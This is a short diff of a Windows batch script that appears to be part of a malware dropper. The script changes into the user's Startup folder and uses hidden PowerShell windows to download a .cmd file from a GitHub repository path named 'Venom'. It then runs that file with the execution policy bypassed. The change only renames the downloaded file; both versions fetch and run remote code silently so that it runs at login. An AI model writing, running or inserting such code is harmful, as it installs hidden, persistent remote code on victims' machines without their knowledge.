@@ -8,9 +8,9 @@ set "STARTUP=C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 
 cd %STARTUP%
 
-powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile IVbaANzwiphH.cmd"
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/initial.cmd -OutFile initial.cmd"
 
-powershell -windowstyle hidden -ExecutionPolicy Bypass ./IVbaANzwiphH.cmd
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./initial.cmd
 
 cd "%INITIALPATH%"
 
